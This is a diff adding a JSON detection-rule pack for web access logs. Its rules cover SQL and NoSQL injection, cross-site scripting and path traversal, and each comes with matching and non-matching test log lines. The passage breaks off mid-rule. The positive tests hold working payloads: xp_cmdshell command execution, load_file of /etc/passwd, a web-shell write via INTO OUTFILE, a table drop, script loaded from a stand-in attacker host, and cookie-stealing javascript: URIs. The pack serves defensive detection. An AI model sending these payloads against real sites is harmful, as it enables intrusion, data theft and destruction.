@@ -1,0 +1,4220 @@
+{
+  "pack": "web-access",
+  "rules": [
+    {
+      "id": "web-sqli-union-select",
+      "name": "SQL injection: UNION SELECT in request",
+      "description": "The decoded request contains UNION followed by SELECT, the classic way to append attacker-chosen rows to a query result.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "\\bunion\\b[\\s/*]{1,40}(?:all[\\s/*]{1,40}|distinct[\\s/*]{1,40})?select\\b"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "sqli"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=35 dec=0 target=/item.php?id=1 union select 1,2,3--"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=49 dec=0 target=/item?id=1/**/UNION/**/ALL/**/SELECT/**/null,null"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/blog/european-union-selection-process",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=38 dec=0 target=/blog/european-union-selection-process"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/search",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=32 dec=0 target=/search?q=union station schedule"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=10 dec=0 target=/item?id=5"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-sqli-boolean-tautology",
+      "name": "SQL injection: boolean tautology",
+      "description": "A quote or whitespace followed by OR/AND and a numeric equality such as 1=1 is a standard probe for injectable parameters.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "any": [
+              {
+                "field": "command",
+                "op": "regex",
+                "pattern": "['\\\")]\\s*(?:or|and)\\s+['\\\"(]?\\d+['\\\")]?\\s*=\\s*['\\\"(]?\\d+"
+              },
+              {
+                "field": "command",
+                "op": "regex",
+                "pattern": "\\s(?:or|and)\\s+\\d{1,6}\\s*=\\s*\\d{1,6}\\b"
+              }
+            ]
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "sqli"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/login",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=28 dec=0 target=/login?user=admin' or '1'='1"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=22 dec=0 target=/item.php?id=1 and 1=1"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/item.php?id=1') or '1'='1"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/search",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/search?q=rock and roll"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/report",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=21 dec=0 target=/report?filter=a or b"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/items",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=33 dec=0 target=/items?sort=price and rating=high"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-sqli-time-based",
+      "name": "SQL injection: time-delay function",
+      "description": "SLEEP, PG_SLEEP, BENCHMARK or WAITFOR DELAY inside a request value is used for blind injection timing probes.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:\\b(?:pg_)?sleep\\s*\\(\\s*\\d|\\bbenchmark\\s*\\(\\s*\\d{3,}\\s*,|waitfor\\s+delay\\s+['\\\"]|dbms_pipe\\.receive_message\\s*\\()"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "sqli",
+        "blind"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/item?id=1 and sleep(5)"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=32 dec=0 target=/item?id=1;select pg_sleep(10)--"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/x",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=32 dec=0 target=/x?id=1';waitfor delay '0:0:5'--"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/health/sleep-tips",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=18 dec=0 target=/health/sleep-tips"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/blog/how-to-sleep-better",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=35 dec=0 target=/blog/how-to-sleep-better?ref=sleep"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/benchmark-results",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/docs/benchmark-results"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-sqli-schema-probe",
+      "name": "SQL injection: database metadata or error-based function",
+      "description": "information_schema, sqlite_master, pg_catalog, @@version, EXTRACTVALUE or UPDATEXML in a request value is used to read schema or leak data through errors.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:information_schema\\.|sqlite_master|pg_catalog\\.|\\bsysobjects\\b|@@version|\\bextractvalue\\s*\\(|\\bupdatexml\\s*\\(|\\bsys\\.(?:databases|tables)\\b)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "sqli"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=65 dec=0 target=/item?id=1 union select table_name from information_schema.tables"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=53 dec=0 target=/item?id=1 and extractvalue(1,concat(0x7e,version()))"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/x",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/x?q=1;select @@version"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/information-schema-guide",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=30 dec=0 target=/docs/information-schema-guide"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/wiki/Schema_(database)",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/wiki/Schema_(database)"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/search",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=25 dec=0 target=/search?q=version history"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-sqli-file-or-exec",
+      "name": "SQL injection: file access or command execution primitive",
+      "description": "xp_cmdshell, LOAD_FILE, INTO OUTFILE or INTO DUMPFILE in a request value is an attempt to read files, write files or run commands through the database.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "critical",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:\\bxp_cmdshell\\b|\\bload_file\\s*\\(|\\binto\\s+(?:out|dump)file\\b|\\bexec(?:ute)?\\s+master\\.\\.|\\butl_http\\.request)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "sqli",
+        "rce"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=46 dec=0 target=/item?id=1;exec master..xp_cmdshell 'whoami'--"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=48 dec=0 target=/item?id=1 union select load_file('/etc/passwd')"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/x",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=37 dec=0 target=/x?id=1 into outfile '/var/www/a.php'"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/outfile-format",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=20 dec=0 target=/docs/outfile-format"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/search",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/search?q=load file dialog"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/files/load_file_list.html",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/files/load_file_list.html"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-sqli-stacked-query",
+      "name": "SQL injection: stacked statement",
+      "description": "A quote, digit or parenthesis followed by a semicolon and a data-changing SQL keyword suggests an attempt to append a second statement.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "['\\\")\\d]\\s*;\\s*(?:drop|insert|update|delete|truncate|alter|create|shutdown)\\s+\\w"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "sqli"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=30 dec=0 target=/item?id=1; drop table users--"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=49 dec=0 target=/item?id=1'; insert into admins values('a','b')--"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/page",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=13 dec=0 target=/page?a=1;b=2"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/item",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=22 dec=0 target=/item?id=1; update=now"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/search",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=44 dec=0 target=/search?q=drop shipping; delete account help"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-nosqli-operator",
+      "name": "NoSQL injection: query operator in a parameter",
+      "description": "A MongoDB-style operator such as [$ne] or [$regex] in a query parameter lets an attacker change the meaning of a lookup (authentication bypass, data extraction).",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "contains",
+            "patterns": [
+              "[$ne]",
+              "[$gt]",
+              "[$lt]",
+              "[$regex]",
+              "[$where]",
+              "[$exists]",
+              "[$nin]",
+              "\"$ne\"",
+              "\"$gt\"",
+              "\"$regex\""
+            ]
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "nosqli"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/login",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=30 dec=0 target=/login?user[$ne]=x&pass[$ne]=x"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api/users",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/api/users?name[$regex]=^a"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api/find",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=22 dec=0 target=/api/find?q={\"$gt\":\"\"}"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/shop",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=14 dec=0 target=/shop?price=$5"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/mongodb-operators",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/docs/mongodb-operators"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api/users",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=18 dec=0 target=/api/users?name=ne"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-xss-script-tag",
+      "name": "Cross-site scripting: script tag in request",
+      "description": "A <script tag in the decoded request is a reflected or stored XSS payload attempt.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "<\\s*script\\b"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "xss"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/search",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=35 dec=0 target=/search?q=<script>alert(1)</script>"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=37 dec=0 target=/a?x=<SCRIPT src=//evil.example/x.js>"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/script-tag-guide",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=22 dec=0 target=/docs/script-tag-guide"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/search",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=29 dec=0 target=/search?q=scripting languages"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/js/script.js",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=13 dec=0 target=/js/script.js"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-xss-event-handler",
+      "name": "Cross-site scripting: HTML tag with event handler",
+      "description": "An HTML tag carrying an on* event handler (onerror, onload, onmouseover, ...) in a request value is a common XSS payload that avoids script tags.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "<[a-z][a-z0-9]{0,12}[^>]{0,80}[\\s/\\\"']on(?:error|load|mouseover|focus|click|toggle|start|animationstart)\\s*="
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "xss"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/s",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=33 dec=0 target=/s?q=<img src=x onerror=alert(1)>"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/s",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/s?q=<svg/onload=alert(1)>"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/s",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=29 dec=0 target=/s?q=\"><body onload=fetch(1)>"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/s",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=27 dec=0 target=/s?q=onerror handling in go"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/onload=true",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/docs/onload=true"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/s",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=16 dec=0 target=/s?q=a<b and c>d"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-xss-javascript-uri",
+      "name": "Cross-site scripting: javascript: URI in parameter",
+      "description": "A javascript: URI assigned to a URL-like attribute or parameter executes code in the victim's browser when followed.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:href|src|action|data|url|redirect|next|return)\\s*=\\s*['\\\"]?\\s*javascript\\s*:"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "xss"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/r",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=40 dec=0 target=/r?url=javascript:alert(document.cookie)"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=27 dec=0 target=/a?next=JaVaScRiPt:alert(1)"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/javascript-basics",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/docs/javascript-basics"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/r",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=37 dec=0 target=/r?url=https://example.org/javascript"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/learn",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=29 dec=0 target=/learn?topic=javascript:intro"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-lfi-dotdot-sequence",
+      "name": "Path traversal: repeated ../ sequences",
+      "description": "Two or more ../ or ..\\ sequences in the decoded request (including percent-encoded and double-encoded forms) try to escape the web root.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:\\.\\.[/\\\\]){2,}"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "traversal"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/download",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=37 dec=0 target=/download?file=../../../../etc/passwd"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/cgi-bin/../../../bin/sh",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=24 dec=0 target=/cgi-bin/../../../bin/sh"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/static/..\\..\\windows\\win.ini",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=29 dec=0 target=/static/..\\..\\windows\\win.ini"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/a/../b",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/docs/a/../b"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/files/archive..tar.gz",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=22 dec=0 target=/files/archive..tar.gz"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
